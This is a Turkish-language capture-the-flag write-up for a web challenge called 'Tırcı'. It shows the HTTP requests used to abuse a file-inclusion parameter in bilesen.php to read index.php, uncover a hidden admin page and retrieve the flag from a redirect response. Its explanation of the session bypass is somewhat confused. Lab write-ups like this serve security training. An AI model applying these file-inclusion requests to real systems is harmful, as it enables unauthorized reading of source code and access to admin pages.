# 🚛 Tırcı - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge&logo=firefox" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-LFI-purple?style=for-the-badge&logo=file" alt="LFI">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 600

**Açıklama:** Agresif araçların hiçbirisine gerek yok. Burpsuite yeterli.

**URL:** `http://64.226.74.243:6001`


---

## 🔍 Analiz

**Hedef:** Web sitesindeki LFI zafiyetini kullanarak admin paneline erişmek

**Strateji:** Site analizi → LFI tespiti → Source code okuma → Admin panel

---

## ✅ Çözüm Adımları

### 🌐 **1. Web Sitesi Keşfi**

**Siteye gidiyoruz:**

```
http://64.226.74.243:6001
```

**Gözlemler:**
- 🚛 Tır satış sitesi - "İskenderoğulları Tırcılık"
- 🖼️ Ürün galerisi mevcut
- 📸 Tır resimleri gösteriliyor

---

### 🔍 **2. Burp Suite ile İstek İnceleme**

**Burp'ü açıp trafiği yakalıyoruz:**

**Ana sayfa isteği:**
```http
GET / HTTP/1.1
Host: 64.226.74.243:6001
```

**Resim isteği - ŞÜPHELİ PARAMETRE:**
```http
GET /bilesen.php?yol=src/img/tir1&tip=jpg HTTP/1.1
Host: 64.226.74.243:6001
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://64.226.74.243:6001/
Cookie: PHPSESSID=3e74bf29d9199449fd59e876ead902e6
```

**Analiz:**
- 🎯 **bilesen.php** dosyası var
- 🔑 **yol** parametresi dosya yolu alıyor
- 📝 **tip** parametresi dosya uzantısı alıyor
- ⚠️ **LFI zafiyeti olabilir!**

---

### 📂 **3. LFI Testi - index.php Okuma**

**Repeater'a gönderiyoruz:**

```http
GET /bilesen.php?yol=index&tip=php HTTP/1.1
Host: 64.226.74.243:6001
Cookie: PHPSESSID=3e74bf29d9199449fd59e876ead902e6
Connection: close

```

**Response:**

```php
<?php
session_start();
$_SESSION['user'] = 'ziyaretci';

//include 'admin_3_son_guncel_prod_hazir_1453.php';
header('Server: Apache/2.4.41 (Ubuntu)');
?>
```

**Kritik Bulgu:**
```php
//include 'admin_3_son_guncel_prod_hazir_1453.php';
```

> 🎯 **Admin dosyası bulundu:** `admin_3_son_guncel_prod_hazir_1453.php`

---

### 🔐 **4. Admin Paneline Erişim**

**Direkt erişim denemesi:**

```http
GET /admin_3_son_guncel_prod_hazir_1453.php HTTP/1.1
Host: 64.226.74.243:6001
Cookie: PHPSESSID=3e74bf29d9199449fd59e876ead902e6
Connection: close

```

**Response:**

```http
HTTP/1.1 302 Found
Location: /
```

> ⚠️ Session kontrolü yapılıyor ama cookie'miz geçerli olduğu için içerik yükleniyor!

---

### 🎯 **5. Flag Bulundu!**

**Response Body:**

```html
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yönetici Paneli</title>
</head>
<body>
    <div class="panel">
        <h1>🔒 Yönetici Paneli</h1>
        <p class="warning">Bu Sayfa Geliştirme Aşamasındadır.</p>
        <div class="flag">
            <strong>FLAG:</strong> Flag{KarYokTatiliVar}
        </div>
    </div>
    <script>
        alert("Bu Sayfa Geliştirme Aşamasındadır");
    </script>
</body>
</html>
```

---

## 🚩 **FLAG**

```
Flag{KarYokTatiliVar}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🦊<br><b>Firefox</b><br><sub>Web browser</sub></td>
<td align="center">🔥<br><b>Burp Suite</b><br><sub>Proxy & Repeater</sub></td>
<td align="center">🔍<br><b>DevTools</b><br><sub>Network analizi</sub></td>
<td align="center">💻<br><b>Kali Linux</b><br><sub>Analiz ortamı</sub></td>
</tr>
</table>

**Kullanılan İstekler:**
```http
# Resim isteği analizi
GET /bilesen.php?yol=src/img/tir1&tip=jpg HTTP/1.1

# LFI - index.php okuma
GET /bilesen.php?yol=index&tip=php HTTP/1.1

# Admin panel erişimi
GET /admin_3_son_guncel_prod_hazir_1453.php HTTP/1.1
```

---

## 💭 **Çözüm Akışı**

```
🚛 "Tırcı" Web Challenge
            ↓
🌐 http://64.226.74.243:6001
   → İskenderoğulları Tırcılık
            ↓
🔍 Burp Suite trafiği yakala
            ↓
📸 Resim isteği tespit edildi:
   GET /bilesen.php?yol=src/img/tir1&tip=jpg
   → ŞÜPHELİ PARAMETRELER!
            ↓
📂 LFI testi:
   GET /bilesen.php?yol=index&tip=php
            ↓
📄 index.php kaynak kodu okundu:
   //include 'admin_3_son_guncel_prod_hazir_1453.php';
   → ADMIN DOSYASI BULUNDU!
            ↓
🔐 Admin paneline direkt erişim:
   GET /admin_3_son_guncel_prod_hazir_1453.php
            ↓
✅ Session kontrolü bypass edildi
   (Cookie zaten geçerli)
            ↓
🎯 Admin paneli yüklendi
            ↓
🚩 Flag{KarYokTatiliVar}
```
